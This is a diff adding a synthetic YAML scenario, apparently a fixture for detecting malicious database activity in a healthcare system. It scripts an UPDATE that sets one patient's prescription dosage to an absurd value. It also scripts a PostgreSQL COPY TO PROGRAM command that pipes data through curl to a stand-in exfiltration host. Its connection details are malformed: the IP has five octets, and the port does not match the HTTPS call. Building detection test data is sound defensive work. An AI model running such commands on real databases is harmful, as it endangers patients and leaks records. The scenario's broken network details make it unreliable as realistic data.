@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_91_data_tamper_mal_2715
+family_id: gen_healthcare_91_data_tamper_mal_fam2715
+domain: healthcare
+time_of_day: '23:05'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.5
+  events:
+  - step_id: act
+    sql: UPDATE prescriptions SET dosage = 270190 WHERE patient_id = 47806
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 194.147.78.78.85
+      port: 445
